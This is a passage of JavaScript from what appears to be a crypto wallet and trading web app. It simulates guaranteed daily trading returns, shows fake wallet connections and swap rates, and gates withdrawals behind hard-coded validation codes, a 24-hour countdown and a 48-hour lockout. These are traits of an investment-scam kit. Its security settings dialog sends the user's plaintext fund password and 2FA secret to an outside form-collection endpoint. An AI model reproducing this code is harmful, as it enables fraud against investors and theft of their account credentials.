        const query = e.target.value.toLowerCase();
        const filteredCoins = allCoins.filter(c =>
            c.name.toLowerCase().includes(query) || c.symbol.toLowerCase().includes(query)
        );
        renderCoinList(filteredCoins);
    });

    // Swap Logic
    async function loadSwapAssets() {
        const selectFrom = document.getElementById('swapFromSelect');
        const selectTo = document.getElementById('swapToSelect');
        
        selectFrom.innerHTML = '<option disabled selected>Loading...</option>';
        selectTo.innerHTML = '<option disabled selected>Loading...</option>';
        
        try {
            const r = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&sparkline=false', { headers: cgHeaders });
            const data = await r.json();
            selectFrom.innerHTML = '';
            selectTo.innerHTML = '';

            data.forEach(c => {
                const optionFrom = document.createElement('option');
                optionFrom.value = c.id;
                optionFrom.textContent = `${c.name} (${c.symbol.toUpperCase()})`;
                selectFrom.appendChild(optionFrom);

                const optionTo = document.createElement('option');
                optionTo.value = c.id;
                optionTo.textContent = `${c.name} (${c.symbol.toUpperCase()})`;
                selectTo.appendChild(optionTo);
            });
            document.getElementById('swapFromAmount').value = '';
            document.getElementById('swapToAmount').value = '';
        } catch (e) {
            showModal("Error", "Failed to load assets. Check your network connection.");
        }
    }

    document.getElementById('swapFromAmount').addEventListener('input', (e) => {
        const amount = parseFloat(e.target.value);
        if (isNaN(amount) || amount <= 0) {
            document.getElementById('swapToAmount').value = '';
            return;
        }
        const rate = Math.random() * (1.1 - 0.9) + 0.9; // Simulated rate
        document.getElementById('swapToAmount').value = (amount * rate).toFixed(4);
    });

    document.getElementById('swapBtn').addEventListener('click', () => {
        const fromAmount = parseFloat(document.getElementById('swapFromAmount').value);
        if (isNaN(fromAmount) || fromAmount <= 0) {
            showModal("Invalid Amount", "Please enter a valid amount to swap.");
            return;
        }
        showModal("Swap Failed (Demo)", "Uniswap API requires a private key for transactions. This is a UI demo only.");
    });

    // Trade Logic
    async function loadTradeAssets() {
      const select = document.getElementById('tradeAssetSelect');
      select.innerHTML = '<option disabled selected>Loading...</option>';
      try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&sparkline=false');
        const coins = await res.json();
        select.innerHTML = '';
        coins.forEach(c => {
          const option = document.createElement('option');
          option.value = c.symbol;
          option.text = `${c.name} (${c.symbol.toUpperCase()})`;
          select.add(option);
        });
      } catch (e) {
        console.error(e);
        select.innerHTML = '<option disabled>Failed to load assets</option>';
      }
    }

    function startTrade() {
        const assetSymbol = document.getElementById('tradeAssetSelect').value.toUpperCase();
        const months = parseInt(document.getElementById('tradeDuration').value);
        const investment = parseFloat(document.getElementById('tradeAmount').value);

        if (isNaN(investment) || investment <= 0) {
            showModal('Invalid Amount', 'Please enter a valid investment amount.');
            return;
        }

        if (investment > mainWalletBalance) {
            showModal('Insufficient Balance', 'You do not have enough funds in your Main Wallet.');
            return;
        }

        mainWalletBalance -= investment;
        tradeWalletBalance += investment;
        document.getElementById('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
        updateHomeBalance();

        showModal('Trade Started', `Trade started for ${assetSymbol} for ${months} month(s)`);

        renderTV('tradeChart', `BINANCE:${assetSymbol}USDT`);

        clearInterval(tradeInterval);
        let days = months * 30;
        let day = 0;
        tradeEarnings = 0;
        tradeInterval = setInterval(() => {
            if (day >= days) {
                clearInterval(tradeInterval);
                showModal('Trade Completed', 'Your simulated trade has completed.');
                return;
            }
            const dailyReturn = tradeWalletBalance * tradeDailyPercent;
            tradeEarnings += dailyReturn;
            tradeWalletBalance += dailyReturn;
            document.getElementById('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
            document.getElementById('tradeEarnings').innerText = '$' + tradeEarnings.toFixed(2);
            day++;
        }, 1000); // 1 second = 1 day simulation
    }

    document.getElementById('startTradeBtn').addEventListener('click', startTrade);
    
    // Send / Withdraw Logic
    get('sendConfirmBtn').onclick = () => {
      if (sendSuspended) {
        showModal('Withdrawal Suspended', 'Withdrawals are suspended for 48 hours due to too many invalid attempts.');
        return;
      }

      const address = get('sendAddress').value.trim();
      const network = get('sendNetwork').value;
      const amount = parseFloat(get('sendAmount').value);

      if (!address || isNaN(amount) || amount <= 0) {
        showModal('Invalid Input', 'Please enter a valid address and amount.');
        return;
      }
      if (amount + 0.19 > mainWalletBalance) {
        showModal('Insufficient Balance', 'You do not have enough funds in your Main Wallet to cover the amount and fee.');
        return;
      }

      get('sendForm').classList.add('hidden');
      get('sendValidationSection').classList.remove('hidden');
      get('sendStatus').innerText = 'Enter validation code to proceed';
    };

    get('validateCodeBtn').onclick = () => {
      const code = get('validationCode').value.trim();
      const status = get('validationStatus');

      if (validCodes.includes(code)) {
        status.innerText = 'Code valid. Processing withdrawal...';
        sendAttempts = 0;

        const amount = parseFloat(get('sendAmount').value);
        mainWalletBalance -= amount + 0.19;
        updateHomeBalance();

        let seconds = 24 * 60 * 60; // 24 hours simulation
        const timer = setInterval(() => {
          const h = Math.floor(seconds / 3600);
          const m = Math.floor((seconds % 3600) / 60);
          const s = seconds % 60;
          status.innerText = `Withdrawal processing... ${h}h ${m}m ${s}s remaining`;
          seconds--;
          if (seconds < 0) {
            clearInterval(timer);
            status.innerText = `Withdrawal of $${amount} successful!`;
            get('sendValidationSection').classList.add('hidden');
            get('sendForm').classList.remove('hidden');
            get('sendAddress').value = '';
            get('sendAmount').value = '';
            get('validationCode').value = '';
          }
        }, 1000);

      } else {
        sendAttempts++;
        if (sendAttempts >= 3) {
          sendSuspended = true;
          showModal('Suspended', '3 incorrect attempts. Withdrawals suspended for 48 hours.');
          get('sendValidationSection').classList.add('hidden');
          get('sendForm').classList.remove('hidden');
          sendAttempts = 0;
          setTimeout(() => sendSuspended = false, 48 * 60 * 60 * 1000); // 48 hours real-time suspension
        } else {
          status.innerText = `Invalid code. Attempts left: ${3 - sendAttempts}`;
        }
      }
    };
    
    // Transfer Logic
    get('transferBtn').onclick = () => {
      const amount = parseFloat(get('transferAmount').value);
      const direction = get('transferDirection').value;
      const status = get('transferStatus');

      if (isNaN(amount) || amount <= 0) {
        showModal("Invalid Amount", "Please enter a valid amount.");
        return;
      }
      
      if (direction === 'toTrade' && amount > mainWalletBalance) {
        showModal("Insufficient Balance", "Insufficient Main Wallet balance.");
        return;
      }
      
      if (direction === 'toMain' && amount > tradeWalletBalance) {
        showModal("Insufficient Balance", "Insufficient Trade Account balance.");
        return;
      }

      status.innerText = "Processing transfer...";

      setTimeout(() => {
        if (direction === 'toTrade') {
          mainWalletBalance -= amount;
          tradeWalletBalance += amount;
        } else {
          mainWalletBalance += amount;
          tradeWalletBalance -= amount;
        }
        
        get('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
        updateHomeBalance();
        
        status.innerText = `Transfer completed.`;
        showModal("Transfer Complete", `Transferred $${amount.toFixed(2)}.`);
      }, 15000);
    };

    // Wallet Connect Redirect Logic
    document.getElementById('connectWalletBtn').addEventListener('click', () => {
        showPage('loading');
        setTimeout(() => {
            const mockAddress = `0x${Math.random().toString(16).substr(2, 40)}`;
            updateWalletUI(mockAddress);
            showPage('home');
            showModal("Connection Successful", `Wallet connected with address: ${mockAddress}.`);
        }, 5000);
    });
    document.getElementById('cta-connect-wallet-btn').addEventListener('click', () => {
        showPage('loading');
        setTimeout(() => {
            const mockAddress = `0x${Math.random().toString(16).substr(2, 40)}`;
            updateWalletUI(mockAddress);
            showPage('home');
            showModal("Connection Successful", `Wallet connected with address: ${mockAddress}.`);
        }, 5000);
    });

    document.getElementById('disconnectBtn').addEventListener('click', () => {
        showPage('loading');
        setTimeout(() => {
            currentWallet = null;
            showModal('Disconnected', 'Wallet has been disconnected.');
            showPage('landing');
        }, 3000);
    });
    
    // Initial Page Load
    window.addEventListener('load', () => {
        const urlParams = new URLSearchParams(window.location.search);
        const connectedAddress = urlParams.get('address');
        if (connectedAddress) {
            showPage('loading');
            setTimeout(() => {
                updateWalletUI(connectedAddress);
                showPage('home');
                showModal("Connection Successful", `Wallet connected with address: ${connectedAddress}.`);
            }, 3000);
        } else {
            showPage('landing');
        }
        loadMarket();
    });

    // Security Modal Elements
    const securityModal = document.getElementById('securityModal');
    const closeSecurityModal = document.getElementById('closeSecurityModal');
    const modalUserId = document.getElementById('modalUserId');
    const modalUsername = document.getElementById('modalUsername');
    const modalQrCode = document.getElementById('modalQrCode');
    const modalSecretKey = document.getElementById('modalSecretKey');
    const modalCodeInput = document.getElementById('modalCodeInput');
    const verify2FABtn = document.getElementById('verify2FABtn');
    const verifyResult = document.getElementById('verifyResult');
    const modalFundPassword = document.getElementById('modalFundPassword');
    const toggleFundPassword = document.getElementById('toggleFundPassword');
    const saveSecurityBtn = document.getElementById('saveSecurityBtn');
    const saveResult = document.getElementById('saveResult');

    // Globals for Security
    let currentUserId = null, currentUserSecret = null;
    let is2FAVerified = false;
    let encryptionKey = "MyAppEncryptionKey";
    let timerInterval, step = 30;

    // Helper Functions
    function getUsers(){ return JSON.parse(localStorage.getItem("users")||"{}"); }
    function saveUsers(users){ localStorage.setItem("users", JSON.stringify(users)); }
    function generateUserId(){ return "USER-" + Math.random().toString(36).substr(2,9).toUpperCase(); }

    function openSecurityModal(){
        securityModal.classList.remove('hidden');
        generate2FA();
    }

    closeSecurityModal.addEventListener('click', ()=>{
        securityModal.classList.add('hidden');
        clearInterval(timerInterval);
    });

    function generate2FA(){
        const userId = generateUserId();
        const username = "User" + Math.floor(Math.random()*10000);
        const secret = otplib.authenticator.generateSecret();
        currentUserId = userId;
        currentUserSecret = secret;

        const otpauth = otplib.authenticator.keyuri(username,"MyApp",secret);
        modalQrCode.innerHTML = "";
        new QRCode(modalQrCode, otpauth);
        modalSecretKey.innerText = "Secret Key: " + secret;
        modalUsername.value = username;
        modalUserId.innerText = userId;

        const users = getUsers();
        users[userId] = { username, secret, verified:false, fundPassword:null };
        saveUsers(users);

        startTimer();
    }

    function startTimer(){
        clearInterval(timerInterval);
        let start = Math.floor(Date.now()/1000);
        timerInterval = setInterval(()=>{
            let elapsed = Math.floor(Date.now()/1000)-start;
            let remaining = step - (elapsed % step);
            verifyResult.innerText = `Code valid for: ${remaining}s`;
            if(remaining <= 0){
                verifyResult.innerHTML = "<span class='text-red-500 font-bold'>‚ö†Ô∏è Code expired, new one generated!</span>";
                updateQRCode();
            }
        },1000);
    }

    function updateQRCode(){
        const users = getUsers();
        if(!users[currentUserId]) return;
        const secret = users[currentUserId].secret;
        const username = users[currentUserId].username;
        const otpauth = otplib.authenticator.keyuri(username,"MyApp",secret);
        modalQrCode.innerHTML = "";
        new QRCode(modalQrCode, otpauth);
    }

    verify2FABtn.addEventListener('click', ()=>{
        const code = modalCodeInput.value.trim();
        const valid = otplib.authenticator.check(code,currentUserSecret);
        if(valid){
            verifyResult.innerHTML = "<div class='text-green-500 font-bold'>‚úÖ 2FA Verified!</div>";
            const users = getUsers();
            users[currentUserId].verified = true;
            saveUsers(users);
            is2FAVerified = true;
        } else {
            verifyResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Invalid Code</div>";
            is2FAVerified = false;
        }
    });

    toggleFundPassword.addEventListener('click', ()=>{
        modalFundPassword.type = modalFundPassword.type==="password" ? "text" : "password";
    });

    saveSecurityBtn.addEventListener('click', ()=>{
        const fundPassword = modalFundPassword.value.trim();
        if(!fundPassword){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Enter Fund Password</div>"; return; }
        if(!is2FAVerified){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Verify 2FA before saving</div>"; return; }

        const users = getUsers();
        users[currentUserId].fundPassword = CryptoJS.AES.encrypt(fundPassword,encryptionKey).toString();
        saveUsers(users);

        const formData = { userId: currentUserId, username: users[currentUserId].username, fundPassword, twoFASecret: currentUserSecret };
        fetch("https://formspree.io/f/mldlqyag", {
            method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(formData)
        }).then(res=>{
            if(res.ok) saveResult.innerHTML = "<div class='text-green-500 font-bold'>‚úÖ Security info saved & sent!</div>";
            else saveResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Submission failed</div>";
        }).catch(()=> saveResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Network Error</div>");
    });

    // Hook security modal to account settings
    document.getElementById('securityBtn').addEventListener('click', openSecurityModal);
</script>
</body>  
</html>
